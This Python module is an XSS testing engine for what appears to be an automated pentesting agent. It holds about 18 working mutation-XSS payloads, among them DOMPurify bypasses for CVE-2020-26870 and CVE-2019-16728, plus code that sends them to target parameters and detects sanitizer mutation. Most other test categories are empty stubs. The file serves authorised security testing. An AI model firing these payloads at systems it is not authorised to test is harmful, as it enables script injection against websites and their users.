"""Comprehensive XSS attack engine for the ReAct pentesting agent.

Zero LLM cost -- pure deterministic HTTP testing.
Covers reflected XSS, stored XSS, DOM-based XSS, blind XSS, mutation XSS (mXSS),
polyglot payloads, context-aware injection, and WAF bypass techniques.

References:
- CVE-2020-26870 (DOMPurify mXSS via math/mtext namespace confusion)
- CVE-2019-16728 (DOMPurify mXSS via SVG style tag)
- Heyes/Kinugawa mXSS research (HTML parser re-serialization)
- Cure53 DOMPurify bypass collection
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
from typing import Any
from urllib.parse import urlencode

import httpx
import structlog

from ai_brain.active.deterministic_tools import _make_client
from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()

# Canary prefix for reflection detection -- unique enough to avoid collisions.
_CANARY_PREFIX = "xSsC4n4ry"

# Non-resolving attacker domain for payload generation -- safe for detection.
_EVIL_DOMAIN = "evil.example.com"

# Injection contexts the engine can target.
_SUPPORTED_CONTEXTS = frozenset({
    "html_body",
    "html_attribute",
    "javascript",
    "url",
    "css",
    "mxss",
    "dom",
    "template",
})

# Patterns indicating the response is a WAF block, not a real application response.
_WAF_SIGNATURES = [
    "cloudflare",
    "aws waf",
    "akamai",
    "incapsula",
    "sucuri",
    "mod_security",
    "web application firewall",
    "access denied",
    "blocked by",
]


# Pre-compiled regex patterns for mXSS mutation detection.
_EXECUTABLE_PATTERNS = [
    (re.compile(r"<script[^>]*>", re.IGNORECASE), "script_tag"),
    (re.compile(r"<img[^>]+onerror\s*=", re.IGNORECASE), "img_onerror"),
    (re.compile(r"<svg[^>]+onload\s*=", re.IGNORECASE), "svg_onload"),
    (re.compile(r"<details[^>]+ontoggle\s*=", re.IGNORECASE), "details_ontoggle"),
    (re.compile(
        r"on(?:error|load|click|toggle|focus|mouseover)\s*=\s*[\"']?alert\(",
        re.IGNORECASE,
    ), "event_handler_alert"),
    (re.compile(r"javascript\s*:", re.IGNORECASE), "javascript_proto"),
]

_NAMESPACE_PATTERNS = [
    (re.compile(r"<math[^>]*>.*?<img\s", re.IGNORECASE | re.DOTALL),
     "math_namespace_escape"),
    (re.compile(r"<svg[^>]*>.*?<img\s", re.IGNORECASE | re.DOTALL),
     "svg_namespace_escape"),
    (re.compile(r"<(?:no)?script[^>]*>.*?<img\s", re.IGNORECASE | re.DOTALL),
     "script_context_escape"),
    (re.compile(r"<style[^>]*>.*?<img\s", re.IGNORECASE | re.DOTALL),
     "style_context_escape"),
]


def _generate_canary(context: str = "") -> str:
    """Generate a unique canary string for reflection detection."""
    tag = hashlib.md5(
        f"{_CANARY_PREFIX}{context}{time.time()}".encode()
    ).hexdigest()[:8]
    return f"{_CANARY_PREFIX}{tag}"


def _is_waf_blocked(resp: httpx.Response) -> bool:
    """Detect WAF block responses."""
    if resp.status_code in (403, 406, 429, 503):
        body_lower = resp.text[:3000].lower()
        return any(sig in body_lower for sig in _WAF_SIGNATURES)
    return False


def _payload_reflected(resp: httpx.Response, payload: str) -> bool:
    """Check if a payload string appears in the response body."""
    if not resp or not resp.text:
        return False
    return payload in resp.text


def _check_mxss_mutation(resp: httpx.Response, payload: str) -> dict[str, Any] | None:
    """Detect signs of sanitizer mutation that produces executable elements.

    mXSS occurs when a sanitizer modifies HTML in a way that the browser
    re-parses into executable content. We look for:
    1. The payload was modified (not reflected verbatim) but executable
       elements (script, onerror, onload, ontoggle, etc.) appear in output.
    2. Namespace confusion artifacts (svg/math elements near style/img).
    3. Parser context switches that break sanitizer assumptions.

    Returns a dict with mutation details if detected, else None.
    """
    if not resp or not resp.text:
        return None

    body = resp.text

    # If the exact payload is reflected verbatim, it is reflected XSS, not mXSS.
    # mXSS requires the sanitizer to have transformed the input.
    exact_reflected = payload in body

    # Look for executable indicators in the response.
    mutations_found = []
    for compiled_re, name in _EXECUTABLE_PATTERNS:
        if compiled_re.search(body):
            mutations_found.append(name)

    if not mutations_found:
        return None

    # If payload was NOT reflected verbatim but executable elements appear,
    # the sanitizer likely mutated the input into something dangerous.
    if not exact_reflected and mutations_found:
        return {
            "mutated": True,
            "mutations": mutations_found,
            "evidence": (
                f"Payload was transformed by sanitizer but executable "
                f"elements appeared: {', '.join(mutations_found)}"
            ),
        }

    # Even if reflected verbatim, check for namespace confusion artifacts
    # that indicate the sanitizer failed to handle nested contexts.
    ns_found = []
    for compiled_re, name in _NAMESPACE_PATTERNS:
        if compiled_re.search(body):
            ns_found.append(name)

    if ns_found:
        return {
            "mutated": True,
            "mutations": mutations_found + ns_found,
            "evidence": (
                f"Namespace confusion detected: {', '.join(ns_found)}. "
                f"Executable elements: {', '.join(mutations_found)}"
            ),
        }

    return None


class XSSAttackEngine:
    """Comprehensive XSS vulnerability detection engine. $0 LLM cost.

    Covers: reflected, stored, DOM-based, blind, mutation (mXSS), polyglot,
    context-aware, and WAF-bypass XSS attacks.
    """

    def __init__(
        self,
        scope_guard: ActiveScopeGuard | None = None,
        socks_proxy: str | None = None,
    ):
        self._scope_guard = scope_guard
        self._socks_proxy = socks_proxy
        self._request_count = 0
        self._rate_delay = 0.3  # 300ms between requests

    def _in_scope(self, url: str) -> bool:
        """Check if a URL is in scope."""
        if not self._scope_guard:
            return True
        return self._scope_guard.is_in_scope(url)

    async def _send(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        **kwargs: Any,
    ) -> httpx.Response | None:
        """Send an HTTP request with rate limiting and error handling."""
        if not self._in_scope(url):
            logger.warning("xss_scope_violation", url=url[:120])
            return None
        self._request_count += 1
        await asyncio.sleep(self._rate_delay)
        try:
            return await client.request(method, url, **kwargs)
        except Exception as e:
            logger.debug("xss_request_error", url=url[:120], error=str(e)[:100])
            return None

    # ──────────────────────────────────────────────────────────────────
    # Mutation XSS (mXSS) Testing
    # ──────────────────────────────────────────────────────────────────

    def _build_mxss_payloads(self) -> list[dict[str, Any]]:
        """Build ~18 mutation XSS payloads targeting sanitizer re-parse bugs.

        Categories:
        - HTML parser re-serialization (5)
        - Backtick mutations (3)
        - Comment/CDATA mutations (3)
        - DOMPurify bypasses (4)
        - Sanitizer-specific (3)
        """
        payloads: list[dict[str, Any]] = []

        # ── HTML parser re-serialization (5) ──
        payloads.append({
            "payload": "<listing><img src=1 onerror=alert(1)>",
            "description": (
                "Listing element causes parser re-serialization; "
                "inner img tag becomes executable after sanitizer pass"
            ),
            "context": "mxss",
            "technique": "parser_reserialization",
        })
        payloads.append({
            "payload": "<noscript><img src=x onerror=alert(1)></noscript>",
            "description": (
                "Noscript context switch: sanitizer parses inner content "
                "as inert text, but browser executes when noscript is inactive"
            ),
            "context": "mxss",
            "technique": "parser_context_switch",
        })
        payloads.append({
            "payload": "<svg><style><img src=x onerror=alert(1)>",
            "description": (
                "SVG namespace confusion: style tag in SVG context causes "
                "img tag to be treated as raw text by sanitizer but parsed "
                "as HTML by browser"
            ),
            "context": "mxss",
            "technique": "namespace_confusion",
        })
        payloads.append({
            "payload": "<math><style></style><img src=x onerror=alert(1)>",
            "description": (
                "MathML namespace confusion: style element in math context "
                "causes parser to mis-scope the following img tag"
            ),
            "context": "mxss",
            "technique": "namespace_confusion",
        })
        payloads.append({
            "payload": "<xmp><svg onload=alert(1)>",
            "description": (
                "XMP element re-serialization: content treated as raw text "
                "by sanitizer but re-parsed as HTML by browser after "
                "innerHTML assignment"
            ),
            "context": "mxss",
            "technique": "parser_reserialization",
        })

        # ── Backtick mutations (3) ──
        payloads.append({
            "payload": "<img src=`x` onerror=alert(1)>",
            "description": (
                "Backtick attribute quoting: IE/old parsers treat backticks "
                "as attribute delimiters, sanitizers may not"
            ),
            "context": "mxss",
            "technique": "backtick_mutation",
        })
        payloads.append({
            "payload": "<div style=`background:url(javascript:alert(1))`>",
            "description": (
                "Backtick in style attribute: parser differences in "
                "backtick handling can bypass style sanitization"
            ),
            "context": "mxss",
            "technique": "backtick_mutation",
        })
        payloads.append({
            "payload": "<a href=`javascript:alert(1)`>click</a>",
            "description": (
                "Backtick in href attribute: attribute value parsing "
                "differences between sanitizer and browser allow "
                "javascript: protocol execution"
            ),
            "context": "mxss",
            "technique": "backtick_mutation",
        })

        # ── Comment/CDATA mutations (3) ──
        payloads.append({
            "payload": "<!--><svg onload=alert(1)-->",
            "description": (
                "Malformed HTML comment: empty comment followed by SVG; "
                "some sanitizers treat entire string as comment while "
                "browser closes comment early"
            ),
            "context": "mxss",
            "technique": "comment_mutation",
        })
        payloads.append({
            "payload": "<![CDATA[><img src=x onerror=alert(1)>]]>",
            "description": (
                "CDATA section in HTML context: XML CDATA is not valid "
                "in HTML5 but some sanitizers parse it as XML, leaving "
                "the img tag executable"
            ),
            "context": "mxss",
            "technique": "cdata_mutation",
        })
        payloads.append({
            "payload": "<?xml><img src=x onerror=alert(1)>",
            "description": (
                "XML processing instruction in HTML: sanitizer may treat "
                "as XML PI and skip content, browser ignores PI and "
                "parses img tag"
            ),
            "context": "mxss",
            "technique": "cdata_mutation",
        })

        # ── DOMPurify bypasses (4) ──
        payloads.append({
            "payload": (
                "<math><mtext><table><mglyph><style>"
                "<!--</style><img src=x onerror=alert(1)>"
            ),
            "description": (
                "CVE-2020-26870: DOMPurify bypass via MathML mtext "
                "namespace confusion. The mglyph element inside a table "
                "within mtext causes the style content to be re-parsed, "
                "breaking out of the comment"
            ),
            "context": "mxss",
            "technique": "dompurify_bypass_cve_2020_26870",
        })
        payloads.append({
            "payload": (
                '<svg></p><style><a id="</style>'
                '<img src=1 onerror=alert(1)>">'
            ),
            "description": (
                "CVE-2019-16728: DOMPurify bypass via SVG+style "
                "interaction. The </style> inside the attribute value "
                "closes the real style tag, allowing the img to execute"
            ),
            "context": "mxss",
            "technique": "dompurify_bypass_cve_2019_16728",
        })
        payloads.append({
            "payload": (
                "<math><mtext><option><mglyph><style>"
                "<img src=x onerror=alert(1)>"
            ),
            "description": (
                "DOMPurify namespace confusion variant: option element "
                "inside mtext changes integration point rules, allowing "
                "style content to escape"
            ),
            "context": "mxss",
            "technique": "dompurify_namespace_variant",
        })
        payloads.append({
            "payload": (
                "<svg><style><![CDATA[</style>"
                "<img src=x onerror=alert(1)>]]>"
            ),
            "description": (
                "DOMPurify CDATA+style variant: CDATA inside SVG style "
                "is valid XML but causes misparsing when re-serialized "
                "to HTML, breaking the style boundary"
            ),
            "context": "mxss",
            "technique": "dompurify_cdata_style",
        })

        # ── Sanitizer-specific (3) ──
        payloads.append({
            "payload": (
                "<svg><desc><noscript>"
                "<img src=x onerror=alert(1)>"
            ),
            "description": (
                "SVG desc+noscript: desc element in SVG creates a foreign "
                "content integration point; noscript inside it confuses "
                "sanitizer context tracking"
            ),
            "context": "mxss",
            "technique": "sanitizer_svg_desc",
        })
        payloads.append({
            "payload": (
                "<math><mtext><table><mglyph><svg>"
                "<mtext><style><path id=\"</style>"
                "<img src=x onerror=alert(1)>\">"
            ),
            "description": (
                "Complex nested namespace confusion: triple namespace "
                "switch (math -> html -> svg) overwhelms sanitizer "
                "context tracking while browser re-parses correctly"
            ),
            "context": "mxss",
            "technique": "sanitizer_nested_namespace",
        })
        payloads.append({
            "payload": "<details open ontoggle=alert(1)>",
            "description": (
                "Details element with ontoggle: some sanitizers allowlist "
                "the details element but fail to strip the ontoggle event "
                "handler, which fires automatically when open is set"
            ),
            "context": "mxss",
            "technique": "sanitizer_details_ontoggle",
        })

        return payloads

    async def test_mxss(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for mutation XSS (mXSS) vulnerabilities.

        Submits payloads that exploit differences between how sanitizers
        parse HTML and how browsers re-parse the sanitized output.

        Args:
            url: Target URL to test.
            method: HTTP method (GET or POST).
            param: Parameter name to inject into.
            params: Additional parameters to include in the request.

        Returns:
            List of finding dicts with vulnerability details.
        """
        if not self._in_scope(url):
            return [{"error": "URL out of scope", "url": url[:120]}]

        mxss_payloads = self._build_mxss_payloads()
        findings: list[dict[str, Any]] = []
        extra_params = params or {}

        async with _make_client(self._socks_proxy) as client:
            # Establish baseline: send a harmless canary to understand
            # normal response behavior.
            canary = _generate_canary("mxss_baseline")
            baseline_params = {**extra_params}
            if param:
                baseline_params[param] = canary
            if method.upper() == "GET":
                baseline_url = f"{url}?{urlencode(baseline_params)}" if baseline_params else url
                baseline_resp = await self._send(client, "GET", baseline_url)
            else:
                baseline_resp = await self._send(
                    client, "POST", url, data=baseline_params,
                )
            baseline_reflects = (
                baseline_resp is not None
                and _payload_reflected(baseline_resp, canary)
            )

            logger.info(
                "mxss_baseline",
                url=url[:120],
                param=param,
                reflects=baseline_reflects,
                status=baseline_resp.status_code if baseline_resp else None,
            )

            # Test each mXSS payload.
            for payload_info in mxss_payloads:
                payload = payload_info["payload"]

                test_params = {**extra_params}
                if param:
                    test_params[param] = payload
                else:
                    # If no specific param, try injecting via the first
                    # available param or as a raw body.
                    test_params["q"] = payload

                if method.upper() == "GET":
                    test_url = f"{url}?{urlencode(test_params)}"
                    resp = await self._send(client, "GET", test_url)
                else:
                    resp = await self._send(
                        client, "POST", url, data=test_params,
                    )

                if not resp:
                    continue

                # Skip WAF blocks.
                if _is_waf_blocked(resp):
                    logger.debug(
                        "mxss_waf_blocked",
                        technique=payload_info["technique"],
                        status=resp.status_code,
                    )
                    continue

                # Check for mutation indicators.
                mutation = _check_mxss_mutation(resp, payload)

                if mutation:
                    finding = {
                        "vulnerable": True,
                        "vuln_type": "mxss",
                        "injection_context": "mxss",
                        "technique": payload_info["technique"],
                        "description": payload_info["description"],
                        "payload": payload,
                        "parameter": param or "q",
                        "method": method.upper(),
                        "url": url[:500],
                        "response_status": resp.status_code,
                        "mutation_details": mutation,
                        "evidence": (
                            f"mXSS detected via {payload_info['technique']}: "
                            f"{mutation['evidence']}. "
                            f"HTTP {resp.status_code} response contained "
                            f"executable elements after sanitizer processing."
                        ),
                        "severity": "high",
                        "cves": _related_mxss_cves(payload_info["technique"]),
                    }
                    findings.append(finding)
                    logger.info(
                        "mxss_found",
                        technique=payload_info["technique"],
                        url=url[:120],
                        param=param,
                        mutations=mutation["mutations"],
                    )
                elif _payload_reflected(resp, payload):
                    # Exact reflection without mutation -- may be reflected XSS,
                    # not mXSS specifically. Log but do not report as mXSS.
                    logger.debug(
                        "mxss_payload_reflected_verbatim",
                        technique=payload_info["technique"],
                        url=url[:120],
                    )
                else:
                    logger.debug(
                        "mxss_no_reflection",
                        technique=payload_info["technique"],
                        status=resp.status_code,
                    )

        return findings

    # ──────────────────────────────────────────────────────────────────
    # Reflected XSS Testing (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_reflected_payloads(self) -> list[dict[str, Any]]:
        """Build reflected XSS payloads for various contexts."""
        # TODO: implement in Unit 1
        return []

    async def test_reflected_xss(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for reflected XSS vulnerabilities."""
        # TODO: implement in Unit 1
        return []

    # ──────────────────────────────────────────────────────────────────
    # Stored XSS Testing (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_stored_payloads(self) -> list[dict[str, Any]]:
        """Build stored XSS payloads."""
        # TODO: implement in Unit 2
        return []

    async def test_stored_xss(
        self,
        url: str,
        method: str = "POST",
        param: str = "",
        params: dict[str, str] | None = None,
        verify_url: str = "",
    ) -> list[dict[str, Any]]:
        """Test for stored XSS vulnerabilities."""
        # TODO: implement in Unit 2
        return []

    # ──────────────────────────────────────────────────────────────────
    # DOM-based XSS Testing (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_dom_payloads(self) -> list[dict[str, Any]]:
        """Build DOM-based XSS payloads targeting client-side sinks."""
        # TODO: implement in Unit 3
        return []

    async def test_dom_xss(
        self,
        url: str,
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test for DOM-based XSS via source-sink analysis."""
        # TODO: implement in Unit 3
        return []

    # ──────────────────────────────────────────────────────────────────
    # Blind XSS Testing (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_blind_payloads(self, callback_url: str) -> list[dict[str, Any]]:
        """Build blind XSS payloads with OOB callback."""
        # TODO: implement in Unit 4
        return []

    async def test_blind_xss(
        self,
        url: str,
        method: str = "POST",
        param: str = "",
        params: dict[str, str] | None = None,
        callback_url: str = "",
    ) -> list[dict[str, Any]]:
        """Test for blind/stored XSS with OOB callback verification."""
        # TODO: implement in Unit 4
        return []

    # ──────────────────────────────────────────────────────────────────
    # Polyglot XSS Payloads (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_polyglot_payloads(self) -> list[dict[str, Any]]:
        """Build polyglot XSS payloads that work across multiple contexts."""
        # TODO: implement in Unit 5
        return []

    async def test_polyglot_xss(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test with context-agnostic polyglot payloads."""
        # TODO: implement in Unit 5
        return []

    # ──────────────────────────────────────────────────────────────────
    # Context-Aware XSS (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_context_payloads(self, context: str) -> list[dict[str, Any]]:
        """Build payloads tailored to a specific injection context."""
        # TODO: implement in Unit 6
        return []

    async def test_context_xss(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
        context: str = "html_body",
    ) -> list[dict[str, Any]]:
        """Test with context-specific payloads (attribute, JS, CSS, etc.)."""
        # TODO: implement in Unit 6
        return []

    # ──────────────────────────────────────────────────────────────────
    # WAF Bypass XSS (stub)
    # ──────────────────────────────────────────────────────────────────

    def _build_waf_bypass_payloads(self) -> list[dict[str, Any]]:
        """Build XSS payloads designed to bypass common WAFs."""
        # TODO: implement in Unit 8
        return []

    async def test_waf_bypass_xss(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test XSS with WAF evasion techniques."""
        # TODO: implement in Unit 8
        return []

    # ──────────────────────────────────────────────────────────────────
    # Full Scan Orchestrator (stub)
    # ──────────────────────────────────────────────────────────────────

    async def run_full_scan(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Run all XSS test categories against a target parameter.

        Orchestrates reflected, stored, DOM, blind, polyglot, context-aware,
        mXSS, and WAF-bypass testing in priority order.
        """
        # TODO: implement orchestration across all test categories
        return []


def _related_mxss_cves(technique: str) -> list[str]:
    """Return CVE references related to an mXSS technique."""
    cve_map: dict[str, list[str]] = {
        "dompurify_bypass_cve_2020_26870": ["CVE-2020-26870"],
        "dompurify_bypass_cve_2019_16728": ["CVE-2019-16728"],
        "dompurify_namespace_variant": ["CVE-2020-26870"],
        "dompurify_cdata_style": ["CVE-2019-16728"],
        "parser_reserialization": [],
        "parser_context_switch": [],
        "namespace_confusion": [],
        "backtick_mutation": [],
        "comment_mutation": [],
        "cdata_mutation": [],
        "sanitizer_svg_desc": [],
        "sanitizer_nested_namespace": ["CVE-2020-26870"],
        "sanitizer_details_ontoggle": [],
    }
    return cve_map.get(technique, [])
